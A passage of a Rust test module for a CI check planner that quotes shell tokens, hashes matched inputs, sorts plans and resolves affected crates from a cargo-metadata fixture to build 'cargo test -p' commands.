            "cairn-core",
            "src-tauri/os/cairn-core/src/lib.rs",
        ] {
            assert_eq!(shell_quote_token(token), token);
        }
        assert_eq!(
            join_args(["-p", "cairn-core", "-p", "cairn-db"]),
            "-p cairn-core -p cairn-db"
        );
    }

    // --- targets: uncertain resolution degrades to a full run --------------

    #[test]
    fn targets_uncertain_resolution_degrades_to_full_suite() {
        // repo_root has no cargo workspace here, so crate-graph resolution is
        // uncertain; the {targets} placeholder degrades to empty and the command
        // runs as the whole suite (a conservative full run).
        let c = check("bun run test:rust {targets}", Some(&["src-tauri/**/*.rs"]));
        let plan = plan_for(c, &[change("src-tauri/x.rs", "modified")]);
        assert_eq!(plan.scope, CheckScope::Full);
        assert_eq!(plan.command, "bun run test:rust");
    }

    // --- deterministic ordering of multiple checks -------------------------

    // --- per-check input hash ---------------------------------------------

    #[test]
    fn check_input_hash_ignores_non_matching_files() {
        let globs = vec!["src-tauri/**".to_string()];
        let base = vec![
            ("src-tauri/a.rs".to_string(), "blobA".to_string()),
            ("docs/x.md".to_string(), "blobX".to_string()),
        ];
        // Changing a NON-matching (doc) blob leaves the input hash unchanged.
        let doc_changed = vec![
            ("src-tauri/a.rs".to_string(), "blobA".to_string()),
            ("docs/x.md".to_string(), "blobY".to_string()),
        ];
        let selector = InputSelector::from_globs(&globs);
        assert_eq!(
            check_input_hash(&base, &selector),
            check_input_hash(&doc_changed, &selector),
            "a doc-only change must not alter a src-tauri check's input hash"
        );
        // Changing a MATCHING blob changes it.
        let src_changed = vec![
            ("src-tauri/a.rs".to_string(), "blobB".to_string()),
            ("docs/x.md".to_string(), "blobX".to_string()),
        ];
        assert_ne!(
            check_input_hash(&base, &selector),
            check_input_hash(&src_changed, &selector)
        );
    }

    /// A glob check's tree component must stay exactly what it always was: the
    /// sorted matched `(path, blob)` pairs, NUL-separated, SHA-256. The selector
    /// changed how the predicate is obtained, not what is hashed — this pins
    /// that so a glob lane's keying is provably unchanged in substance.
    #[test]
    fn a_glob_selector_hashes_exactly_the_matched_entries() {
        use sha2::{Digest, Sha256};
        let globs = vec!["src/**".to_string()];
        let entries = vec![
            ("src/b.ts".to_string(), "blobB".to_string()),
            ("docs/x.md".to_string(), "blobX".to_string()),
            ("src/a.ts".to_string(), "blobA".to_string()),
        ];
        let mut expected = Sha256::new();
        for (path, blob) in [("src/a.ts", "blobA"), ("src/b.ts", "blobB")] {
            expected.update(path.as_bytes());
            expected.update([0u8]);
            expected.update(blob.as_bytes());
            expected.update([0u8]);
        }
        assert_eq!(
            check_input_hash(&entries, &InputSelector::from_globs(&globs)),
            format!("{:x}", expected.finalize())
        );
    }

    #[test]
    fn check_input_hash_is_order_independent() {
        let globs = vec!["src/**".to_string()];
        let a = vec![
            ("src/a.ts".to_string(), "1".to_string()),
            ("src/b.ts".to_string(), "2".to_string()),
        ];
        let b = vec![
            ("src/b.ts".to_string(), "2".to_string()),
            ("src/a.ts".to_string(), "1".to_string()),
        ];
        let selector = InputSelector::from_globs(&globs);
        assert_eq!(
            check_input_hash(&a, &selector),
            check_input_hash(&b, &selector)
        );
    }

    #[test]
    fn plans_are_sorted_by_name() {
        let mut map = HashMap::new();
        map.insert("zebra".to_string(), check("z", None));
        map.insert("alpha".to_string(), check("a", None));
        map.insert("mike".to_string(), check("m", None));
        let plans = plan_checks(
            &map,
            &inputs(&map),
            &[change("x", "modified")],
            Path::new("/repo"),
        );
        let names: Vec<&str> = plans.iter().map(|p| p.name.as_str()).collect();
        assert_eq!(names, vec!["alpha", "mike", "zebra"]);
    }

    // --- crate-graph resolver (hermetic, fixture metadata) -----------------

    /// A 4-member workspace mirroring this repo's shape: cairn-common is a leaf
    /// dependency; cairn-core and cairn-cmd depend on it; cairn (the app)
    /// depends on cairn-core. Manifest paths are anchored under `/repo`.
    fn fixture_metadata() -> String {
        serde_json::json!({
            "packages": [
                {
                    "name": "cairn-common",
                    "manifest_path": "/repo/src-tauri/os/cairn-common/Cargo.toml",
                    "dependencies": []
                },
                {
                    "name": "cairn-core",
                    "manifest_path": "/repo/src-tauri/os/cairn-core/Cargo.toml",
                    "dependencies": [{ "name": "cairn-common" }]
                },
                {
                    "name": "cairn-cmd",
                    "manifest_path": "/repo/src-tauri/os/cairn-cmd/Cargo.toml",
                    "dependencies": [{ "name": "cairn-common" }]
                },
                {
                    "name": "cairn",
                    "manifest_path": "/repo/src-tauri/Cargo.toml",
                    "dependencies": [
                        { "name": "cairn-core" },
                        { "name": "serde" }
                    ]
                }
            ]
        })
        .to_string()
    }

    fn resolve(files: &[&str]) -> Option<Vec<String>> {
        let owned: Vec<String> = files.iter().map(|s| s.to_string()).collect();
        resolve_crate_targets_from_metadata(&fixture_metadata(), &owned, Path::new("/repo"))
    }

    #[test]
    fn crate_graph_leaf_crate_selects_only_itself() {
        // cairn-cmd has no workspace dependents.
        let targets = resolve(&["src-tauri/os/cairn-cmd/src/main.rs"]).unwrap();
        assert_eq!(targets, vec!["cairn-cmd".to_string()]);
    }

    #[test]
    fn crate_graph_depended_on_crate_selects_transitive_dependents() {
        // cairn-common is depended on by cairn-core and cairn-cmd; cairn-core is
        // depended on by the app. So a change in cairn-common affects all four.
        let targets = resolve(&["src-tauri/os/cairn-common/src/uri.rs"]).unwrap();
        assert_eq!(
            targets,
            vec![
                "cairn".to_string(),
                "cairn-cmd".to_string(),
                "cairn-common".to_string(),
                "cairn-core".to_string(),
            ]
        );
    }

    #[test]
    fn crate_graph_nested_member_wins_over_ancestor_workspace_member() {
        // src-tauri/os/cairn-core/... is under both the cairn app dir (src-tauri)
        // and the cairn-core dir; the deeper member must win.
        let targets = resolve(&["src-tauri/os/cairn-core/src/lib.rs"]).unwrap();
        // cairn-core plus the app that depends on it.
        assert_eq!(targets, vec!["cairn".to_string(), "cairn-core".to_string()]);
    }

    #[test]
    fn crate_graph_app_crate_file_selects_only_app() {
        let targets = resolve(&["src-tauri/src/main.rs"]).unwrap();
        assert_eq!(targets, vec!["cairn".to_string()]);
    }

    #[test]
    fn crate_graph_unmappable_file_returns_none() {
        // A file outside every member directory cannot be attributed.
        assert!(resolve(&["web/src/App.tsx"]).is_none());
    }

    #[test]
    fn crate_graph_mixed_mappable_and_unmappable_returns_none() {
        assert!(resolve(&["src-tauri/os/cairn-cmd/src/main.rs", "docs/x.md"]).is_none());
    }

    #[test]
    fn crate_graph_malformed_metadata_returns_none() {
        let owned = vec!["src-tauri/os/cairn-cmd/src/main.rs".to_string()];
        assert!(
            resolve_crate_targets_from_metadata("not json", &owned, Path::new("/repo")).is_none()
        );
    }

    #[test]
    fn crate_graph_multiple_seeds_union_their_closures() {
        // A change in both cairn-cmd (leaf) and cairn-core (depended on by app).
        let targets = resolve(&[
            "src-tauri/os/cairn-cmd/src/main.rs",
            "src-tauri/os/cairn-core/src/lib.rs",
        ])
        .unwrap();
        assert_eq!(
            targets,
            vec![
                "cairn".to_string(),
                "cairn-cmd".to_string(),
                "cairn-core".to_string(),
            ]
        );
    }

    // --- end-to-end: targets mode through the planner ----------------------

    #[test]
    fn targets_crate_graph_substitutes_resolved_targets() {
        // Drive the full planner with a crate-graph targets check. Resolution
        // shells out to cargo metadata against repo_root/src-tauri; in the test
        // worktree that path is real, but to stay hermetic we instead assert the
        // pure resolver+substitution wiring via a direct command build.
        let resolved = resolve(&["src-tauri/os/cairn-cmd/src/main.rs"]).unwrap();
        let args = resolved
            .iter()
            .map(|c| format!("-p {c}"))
            .collect::<Vec<_>>()
            .join(" ");
        let command = substitute("cargo test {targets}", TARGETS_PLACEHOLDER, &args);
        assert_eq!(command, "cargo test -p cairn-cmd");
    }
}
